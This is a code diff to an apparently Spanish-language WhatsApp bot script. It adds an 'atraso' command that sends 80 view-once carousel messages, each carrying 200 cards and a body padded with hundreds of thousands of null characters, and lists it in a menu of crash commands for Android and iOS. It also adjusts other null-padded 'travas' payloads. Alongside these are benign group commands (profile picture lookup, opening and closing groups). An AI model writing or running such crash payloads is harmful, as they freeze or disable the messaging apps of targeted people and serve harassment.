@@ -749,6 +749,95 @@ case "statusbox": {
   }
   break;
 }
+case 'atraso':
+  if (!isBot && !isCreator) return
+
+  // Reacción inicial
+  await conn.sendMessage(m.chat, { react: { text: '⏳️', key: m.key } })
+
+  const imagePath = "./src/foto.jpg"
+  const groupLink = "kkkkkk"
+  const bodyText = "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
+
+  // Función para crear un card
+  async function createCard(i) {
+    return {
+      header: proto.Message.InteractiveMessage.Header.create({
+        ...(await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer })),
+        title: `\n${groupLink}\n #${i}`,
+        gifPlayback: true,
+        subtitle: " ",
+        hasMediaAttachment: false
+      }),
+      body: { text: bodyText + " ⚡" + i },
+      nativeFlowMessage: {
+        buttons: [{
+          name: "cta_url",
+          buttonParamsJson: JSON.stringify({
+            display_text: "bay bay ",
+            url: groupLink,
+            merchant_url: groupLink
+          })
+        }]
+      }
+    }
+  }
+
+  // Generar cientos de cards (ej: 200)
+  const cards = []
+  for (let i = 0; i < 200; i++) {
+    cards.push(await createCard(i))
+  }
+
+  // Mandar el payload muchas veces
+  for (let i = 0; i < 80; i++) {
+    await conn.relayMessage(from, {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: { text: bodyText + "\0".repeat(0x99999) }, // muchísimo más grande
+            carouselMessage: { cards }
+          }
+        }
+      }
+    }, { participant: { jid: from } })
+  }
+
+  // Reacción final
+  await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
+  break
+case 'profile': {
+    try {
+        let user;
+        if (m.quoted) {
+            user = m.quoted.sender;
+        } else if (text) {
+            let number = text.replace(/[^0-9]/g, '');
+            // Agregar @s.whatsapp.net si no está incluido
+            user = number.includes('@s.whatsapp.net') ? number : number + '@s.whatsapp.net';
+        } else {
+            return reply('Responde a un mensaje o ingresa un número');
+        }
+        try {
+            let ppUrl = await conn.profilePictureUrl(user, 'image');
+            await conn.sendMessage(m.chat, { 
+                image: { url: ppUrl },
+                caption: `*Profile:* @${user.split('@')[0]}`,
+                mentions: [user]
+            }, { quoted: m });
+        } catch (err) {
+            await conn.sendMessage(m.chat, { 
+                text: `null`,
+                mentions: [user]
+            }, { quoted: m });
+        }
+    } catch (e) {
+        console.error(e);
+        reply('error');
+    }
+  }
+    break;
+
 case 'button':
 if (!isBot && !isCreator) return
 if (m.isGroup && groupid.includes(m.chat)) {
@@ -1051,6 +1140,48 @@ var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
 conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
 }
 break 
+case "open":
+    try {
+        const groupMetadata = await conn.groupMetadata(m.chat);
+        const isAdmin = groupMetadata.participants.some(
+            (participant) => participant.id === m.sender && participant.admin
+        );
+        if (!isAdmin) {
+            return conn.sendMessage(m.chat, { text: "❌ Solo los administradores pueden usar este comando." });
+        }
+        if (groupMetadata.announce) { // Si el grupo está cerrado
+            
+            // Corrección aquí
+            await conn.groupSettingUpdate(m.chat, "not_announcement"); // Se usa "not_announcement" para abrir el grupo
+            const updatedGroupMetadata = await conn.groupMetadata(m.chat);
+            await conn.sendMessage(from, { react: { text: '✅', key: m.key } });
+        } else {
+            await conn.sendMessage(m.chat, { text: "⚠️ El grupo ya está abierto." });
+        }
+    } catch (error) {
+        console.error("Error al abrir el grupo:", error);
+        await conn.sendMessage(m.chat, { text:  `❌ Error al abrir el grupo: ${error.message}  `});
+    }
+    break;
+case "close":
+    try {
+        // Verificar si el usuario es un administrador
+        const groupMetadata = await conn.groupMetadata(m.chat);
+        const isAdmin = groupMetadata.participants.some(
+            (participant) => participant.id === m.sender && participant.admin
+        );
+        if (!isAdmin) {
+            return conn.sendMessage(m.chat, { text: "> Solo los administradores pueden usar este comando." });
+        }
+        // Cerrar el grupo
+        await conn.groupSettingUpdate(m.chat, "announcement", true); // Solo los administradores pueden enviar mensajes
+        await conn.sendMessage(from, { react: { text: '✅', key: m.key } });
+
+    } catch (error) {
+        console.log("Error al cerrar el grupo:", error.message);
+        return conn.sendMessage(m.chat, { text: `❌ Error al cerrar el grupo: ${error.message} `});
+    }
+    break;
 case "carouselv2": {
 if (!isBot && !isCreator) return
 let haxxn = 10;
@@ -1096,7 +1227,7 @@ push.push({
     "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
     "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
     "mediaKeyTimestamp": "1721344123",
-    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
+    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
     "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
     "scanLengths": [
       247,
@@ -1125,7 +1256,7 @@ const carousel = generateWAMessageFromContent(from, {
 },
 "interactiveMessage": {
     "body": {
-        "text": '\u0000\u0000\u0000\u0000'
+        "text": '\u0000\u0000'
     },
     "footer": {
         "text": "¿Kkkkkk?"
@@ -1245,6 +1376,7 @@ if (!isBot && !isCreator) return;
   ANDORID
 > crash-home 593xxx
 > canal-adm
+> atraso
 > carouselv2
   IOS 
 > home-ios 593xxxx
@@ -1300,7 +1432,7 @@ if (!isBot && !isCreator && !isNose) return
 if (m.isGroup && groupid.includes(m.chat)) {
     return reply("❎❎❎❎");
 }
-conn.relayMessage(from,{"newsletterAdminInviteMessage":{"newsletterJid":"120363282786345717@newsletter","newsletterName":"🗣🗣🗣🗣" + travas + travas + travas ,"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAAoAAEBAQAAAAAAAAAAAAAAAAAAAQYBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAM4AAAgqCoAAAAAAAAAKBAAAA//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8Af//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AJ//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AJ//Z","caption":"𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁","inviteExpiration":"1717872809"}},{})
+conn.relayMessage(from,{"newsletterAdminInviteMessage":{"newsletterJid":"120363282786345717@newsletter","newsletterName":"🗣🗣🗣🗣" + travas + travas + travas ,"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADMARwMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z","caption":"𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁","inviteExpiration":"1717872809"}},{})
 conn.relayMessage(from,{extendedTextMessage: {text: `𝐏.𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘  ᶻ 𝗓 𐰁`}},{})
 break
 
